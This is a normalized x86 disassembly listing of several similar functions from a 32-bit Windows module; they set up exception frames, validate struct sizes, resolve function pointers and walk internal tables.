lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_100084f5
jmp r-xdata
dec eax
je r-xdata
call sub_100096ce
add esp 0xc
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x2
lea eax [ ebp - 0x14 ]
push edi
push eax
jae r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
pop esi
leave
retn
push edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
push sub_10008732
jmp r-xdata
push sub_100085dc
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x14 ]
push edi
push eax
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push esi
call sub_1000d31c
push sub_10008888
jmp r-xdata
sub_1000840e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] edi
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x108 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov edx 0x220
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffec
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ecx + 0x48 ]
mov eax [ eax + edi * 8 ]
mov [ ebp - 0x2c ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edi 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edi
mov [ ebp - 0x28 ] edi
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx edx
jne r-xdata
cmp edi [ ecx + 0x30 ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] edx
and [ ebp - 0x20 ] 0x0
sub_100084f5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] edi
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x12c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov edx 0x220
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffec
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ecx + 0x58 ]
mov eax [ eax + edi * 8 ]
mov [ ebp - 0x2c ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edi 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edi
mov [ ebp - 0x28 ] edi
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx edx
jne r-xdata
cmp edi [ ecx + 0x3c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] edx
and [ ebp - 0x20 ] 0x0
sub_100085dc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100086f3
jmp r-xdata
mov eax [ edi + 0x5c ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x40 ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_10008732
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_10008849
jmp r-xdata
mov eax [ edi + 0x68 ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x4c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_10008888
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp sub_100089cf
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_1000899f
jmp r-xdata
mov eax [ edi + 0x68 ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp sub_100089cf
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x4c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_100089de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x38 ] edi
xor edx edx
push 0xffffffe1
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov eax edx
shl eax 0x3
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x3c ] ecx
cmp [ ecx + 0x1 ] 0x2
jb r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x44 ] eax
cmp eax ebx
jne r-xdata
xor edx edx
inc edx
jmp r-xdata
cmp [ ecx + 0x8 ] 0x20
jne r-xdata
lea ecx [ edi + 0xd0 ]
push ecx
push [ edi + 0x78 ]
push [ edi + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d4d6
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax edx
shl eax 0x3
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x40 ] ecx
cmp [ ecx + 0x1 ] 0x2
jb r-xdata
mov [ ebp - 0x34 ] edx
cmp edx [ edi + 0x78 ]
jae r-xdata
add ecx 0xc
cmp [ ecx ] 0x220
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
pop eax
mov [ ebp - 0x4 ] ebx
call sub_10008bec
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ ecx + 0x8 ] 0x20
jne r-xdata
mov [ esi + 0x4 ] ecx
mov ecx [ ecx ]
mov [ esi + 0x8 ] ecx
mov ecx [ edi + 0x90 ]
lea ecx [ eax + ecx + 0x4 ]
mov [ esi + 0xc ] ecx
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx + 0x4 ]
mov [ esi + 0x10 ] ecx
mov ecx [ edi + 0x90 ]
mov [ eax + ecx + 0x4 ] 0x7
mov [ ebp - 0x20 ] ebx
inc edx
jmp r-xdata
add ecx 0xc
mov ebx [ ecx ]
and ebx 0xff0
cmp ebx 0x220
jne r-xdata
mov [ ebp - 0x34 ] edx
cmp edx [ edi + 0x78 ]
jae r-xdata
xor ebx ebx
mov [ esi + 0x4 ] ecx
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov edx [ edi + 0x90 ]
lea edx [ eax + edx + 0x4 ]
mov [ esi + 0xc ] edx
mov edx [ edi + 0x90 ]
mov edx [ eax + edx + 0x4 ]
mov [ esi + 0x10 ] edx
mov [ ecx ] ebx
mov ecx [ edi + 0x90 ]
mov [ eax + ecx + 0x4 ] 0x7
xor ebx ebx
mov [ ebp - 0x20 ] ebx
jmp r-xdata
sub_10008c2b
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ eax ] 0x0
push ebx
push edi
push 0x18
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_1000d316
push 0xffffffe6
pop eax
jmp r-xdata
pop esi
leave
retn
sub_10008cc1
add esp 0xc
lea eax [ ebp - 0xb4 ]
mov [ ebp - 0xb4 ] esi
push eax
call [ GetVersionExA@IAT ]
xor eax eax
mov al bh
movzx eax al
sub eax 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_10008e9a
jmp r-xdata
dec eax
je r-xdata
call sub_100096ce
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp - 0x20 ] 0x2
lea eax [ ebp - 0x18 ]
push 0x18
push eax
jae r-xdata
dec eax
jne r-xdata
mov eax edi
pop edi
pop ebx
pop esi
leave
retn
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
push sub_10009185
jmp r-xdata
push sub_10008fd5
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x18 ]
push 0x18
push eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push sub_10009335
jmp r-xdata
sub_10008d5f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
mov edi [ eax + 0x108 ]
mov [ ebp - 0x30 ] edi
xor eax eax
mov [ ebp - 0x2c ] eax
push 0xffffffec
pop eax
jmp r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ edi + 0x48 ]
mov ebx [ ecx + eax * 8 ]
mov [ ebp - 0x34 ] ebx
push [ esi + 0x4 ]
push ebx
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x2c ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
and [ ebp - 0x38 ] 0x0
cmp eax [ edi + 0x30 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + ebx ] ecx
inc [ ebp - 0x38 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x2c ]
shl eax 0x3
mov ecx [ edi + 0x48 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0x48 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ ebx + 0x1 ]
cmp [ ebp - 0x38 ] eax
jae r-xdata
sub_10008e9a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
mov edi [ eax + 0x12c ]
mov [ ebp - 0x30 ] edi
xor eax eax
mov [ ebp - 0x2c ] eax
push 0xffffffec
pop eax
jmp r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ edi + 0x58 ]
mov ebx [ ecx + eax * 8 ]
mov [ ebp - 0x34 ] ebx
push [ esi + 0x4 ]
push ebx
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x2c ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
and [ ebp - 0x38 ] 0x0
cmp eax [ edi + 0x3c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + ebx ] ecx
inc [ ebp - 0x38 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x2c ]
shl eax 0x3
mov ecx [ edi + 0x58 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0x58 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ ebx + 0x1 ]
cmp [ ebp - 0x38 ] eax
jae r-xdata
sub_10008fd5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_10009146
jmp r-xdata
mov ecx [ ebx + 0x5c ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x40 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d4d6
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x5c ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x5c ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_10009185
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100092f6
jmp r-xdata
mov ecx [ ebx + 0x68 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x4c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d4d6
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x68 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_10009335
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100094a6
jmp r-xdata
mov ecx [ ebx + 0x68 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
